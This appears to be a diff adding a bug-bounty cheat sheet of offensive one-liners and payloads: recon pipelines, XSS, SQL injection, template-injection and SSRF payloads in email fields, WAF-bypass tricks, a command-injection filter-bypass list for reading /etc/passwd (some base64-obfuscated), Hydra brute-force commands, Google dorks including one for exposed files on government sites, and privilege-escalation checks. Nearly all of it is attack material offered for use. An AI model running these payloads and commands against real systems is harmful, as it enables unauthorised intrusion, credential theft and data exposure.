@@ -1,0 +1,192 @@
+https://www.linkedin.com/in/bhavesh--pardhi/recent-activity/all/
+
+1. Heartbleed Scanner in One Line Quickly check a list of hosts for the infamous Heartbleed vulnerability (CVE-2014-0160):
+cat list.txt | while read line ; do echo "QUIT" | openssl s_client -connect $line:443 2>&1 | grep 'server extension "heartbeat" (id=15)' || echo $line: safe; done
+
+2. Extract URLs Like a Pro Extract URLs from junk data or JS files:
+grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" file.txt
+curl http://target.com/file.js | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*"
+
+3. Subdomain Recon Script:
+amass enum --passive -d target.com -o domains
+assetfinder --subs-only target.com | tee -a domains
+subfinder -d target.com -o subfinder_domains
+cat subfinder_domains >> domains
+sort -u domains > final_domains.txt
+cat final_domains.txt | filter-resolved > alive_domains.txt
+
+4. Curl + Parallel = Recon Beast:
+cat alive.txt | parallel -j50 -q curl -w 'Status:%{http_code}\tSize:%{size_download}\t%{url_effective}\n' -o /dev/null -sk
+
+5. Simple XSS Finder Script:
+subfinder -d target.com -o subs
+amass enum --passive -d target.com -o amass_subs
+cat subs amass_subs | filter-resolved | tee resolved.txt
+cat resolved.txt | httprobe -p http:81 -p http:8080 -p https:8443 | waybackurls | kxss > xss.txt
+
+6. XSS:
+test+(<​script>alert(0)<​/script>)@example.com
+test@example(<​script>alert(0)<​/script>).com
+"<​script>alert(0)<​/script>"@example.com
+
+7. Template Injection:
+"<%= 7 * 7 %>"@example.com
+test+(${{7*7}})@example.com
+
+8. SQL Injection:
+"' OR 1=1 -- '"@example.com
+"mail'); DROP TABLE users;--"@example.com
+
+9. SSRF:
+john.doe@abc123.burpcollaborator.net
+john.doe@127.0.0.1
+
+10. Parameter Pollution: victim&email=attacker@example.com
+
+11. Email Header Injection:
+"%0d%0aContent-Length:%200%0d%0a%0d%0a"@example.com
+"recipient@test.com>\r\nRCPT TO:<victim+"@test.com
+
+12. Sensitive Data Leak via .json. Try changing the request to .json:
+Request 1:
+GET /ResetPassword HTTP/1.1
+{"email":"victim@example.com"}
+Response: 200 OK
+
+Request 2:
+GET /ResetPassword.json HTTP/1.1
+{"email":"victim@example.com"}
+Response:
+{"success":"true","token":"596a96-cc7bf-9108c-d896f-33c44a-edc8a"}
+
+13. Authentication Bypass Tip:
+Try using a header:
+Request:
+GET /delete?user=test HTTP/1.1
+X-Custom-IP-Authorization: 127.0.0.1
+Response: 302 Found
+
+14. Find Access Tokens using ffuf + gau:
+Gather URLs: cat hosts | sed 's/https\?:\/\///' | gau > urls.txt
+Filter JS files: cat urls.txt | grep -P "\w+\.js(\?|$)" | sort -u > jsurls.txt
+Fuzz and replay to Burp: ffuf -mc 200 -w jsurls.txt:HFUZZ -u HFUZZ -replay-proxy http://127.0.0.1:8080
+
+15. 14 Google Dorks for Recon and Easy Wins:
+Login panel search: site:target.com inurl:admin | administrator | adm | login | l0gin | wp-login
+Login panel search #2: intitle:"login" "admin" site:target.com
+Admin panel search: inurl:admin site:target.com
+Search for exposed files: site:gov.in ext:txt|ext:doc|ext:docx|ext:odt|ext:pdf|ext:rtf|ext:sxw|ext:psw|ext:ppt|ext:pptx|ext:pps|ext:csv|ext:mdb
+Open directories (Index of): intitle:"index of /" Parent Directory site:target.com
+Exposed admin directories: intitle:"index of /admin" site:target[.]com
+Exposed password directories: intitle:"index of /password" site:target.com
+Mail directories: intitle:"index of /mail" site:target.com
+Directories with passwords: intitle:"index of /" (passwd | password.txt) site:target[.]com
+.htaccess files: intitle:"index of /" .htaccess site:target.com
+.txt files with passwords: inurl:passwd filetype:txt site:target.com
+Database files: inurl:admin filetype:db site:target.com
+Log files: filetype:log site:target.com
+External sites linking to target: link:target.com -site:target.com
+
+Link : https://pentest-tools.com/information-gathering/google-hacking
+
+16. XSS WAF Bypass Techniques & Upload-Based Attack Possibilities:
+
+If a WAF blocks javascript​: in your payload, try these:
+1. → java\nscript: → Add \n, \t, or \r inside
+2. → \x01javascript​: → Add low ASCII chars (\x00–\x20) in front
+3. → jaVAscrIpt​: → Mix upper and lowercase letters
+
+7 XSS Firewall Bypass Techniques:
+1. → Mix cases: <​sCRipT>alert(1)<​/sCRiPt>
+2. → Use CRLF (\r\n): <​script>%0d%0aalert(1)<​/script>
+3. → Double encode: %2522
+4. → Test recursive filters: <scr<​script>ipt>alert(1)</scr<​/script>ipt>
+5. → No-whitespace anchor tag: <a/href="j&Tab;a&Tab;v&Tab;asc&Tab;ri&Tab;pt​:alert(1)">
+6. → Bullet char to bypass whitespace: <svg•onload=alert(1)>
+7. → Change request method: Try POST instead of GET
+
+Top 10 File Upload Attack Possibilities:
+ASP / ASPX / PHP5 / PHP / PHP3 → Webshell / RCE
+SVG → Stored XSS / SSRF / XXE
+GIF → Stored XSS / SSRF
+CSV → CSV injection
+XML → XXE
+AVI → LFI / SSRF
+HTML / JS → HTML injection / XSS / Open Redirect
+PNG / JPEG → Pixel Flood Attack (DoS)
+ZIP → RCE via LFI / DoS
+PDF / PPTX → SSRF / Blind XXE
+
+17. XSS Alert Obfuscation + Advanced XSS Methodology + Subdomain Recon + Command Injection Filter Bypass:
+
+XSS Payload: Alert Obfuscation (RegEx Bypass) : <img src="X" onerror​=top >
+
+• General Automated XSS Methodology:
+echo "target.com" | gau --threads 5 >> endpoints.txt
+cat httpx.txt | katana -jc >> endpoints.txt
+cat endpoints.txt | uro >> endpoints_x.txt
+cat endpoints_x.txt | gf xss >> xss.txt
+cat xss.txt | Gxss -p khXSS -o XSS_Ref.txt
+
+• Subdomain Recon + JS Crawl One-Liner:
+subfinder -d target.com | dnsx | httpx -silent | xargs -I{} katana -u {} -d 5 -jc -jsl -aff -kf all -mrs 5242880 -timeout 15 -retry 3 -s breadth-first -iqp -cs {} -f url -sf url -rl 200 -p 20 -dr -nc -H -silent -fdc 'status_code == 404'
+
+• Command Injection Filter Bypass Cheatsheet
+cat /etc/passwd
+cat /e"t"c/pa"s"swd
+cat /'e'tc/pa's'swd
+cat /etc/pa??wd
+cat /etc/pa*wd
+cat /et' 'c/passw' 'd
+cat /et$()c/pa$()$swd
+cat /et${neko}c/pas${poi}swd
+{cat,/etc/passwd}
+echo "dwssap/cte/ tac" | rev
+$(echo Y2FOIC9ldGMvcGFzc3dkCg== | base64 -d)
+w\ho\am\i
+/\b\i\n/////s\h
+who$@ami
+xyz%0Acat%20/etc/passwd
+IFS=,;`cat<<<uname,-a`
+/???/??t /???/p??s??
+test=/ehhh/hmtc/pahhh/hmsswd
+cat ${test//hhh\/hm/}
+cat ${test//hh??hm/}
+
+18. Hydra Tool for Brute Forcing:
+hydra -l USERNAME -P wordlist.txt ftp://target.com
+hydra -L users.txt -P passwords.txt http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid Login"
+hydra -L usernames.txt -P passwords.txt ssh://192.168.1.1
+hydra -L users.txt -P passwords.txt -t 16 -vV ftp://target.com
+
+19. FFUF – The Tool Every Beginner Must Try:
+ffuf -u https://target.com/FUZZ -w wordlist.txt
+ffuf -u https://target.com/page.php?FUZZ=test -w params.txt
+ffuf -u https://FUZZ.target.com -w subdomains.txt -H "Host: FUZZ.target.com"
+ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,403 -t 50 -o result.txt -e .php,.bak,.zip
+
+Wordlists:
+/usr/share/seclists/Discovery/Web-Content/common.txt
+raft-medium-words.txt
+directory-list-2.3-medium.txt
+/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
+/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+
+20. Linux Privilege Escalation:
+🧑‍💻 Sudo Misconfigurations: sudo -l
+🛠️ SUID Binaries : find / -perm -4000 2>/dev/null
+✍️ Writable /etc/passwd : ls -l /etc/passwd
+⏰ Cron Jobs : ls -la /etc/cron*  | grep root
+🧬 Kernel Exploits : uname -a
+
+
+
+
+
+
+
+
+
+
+
+
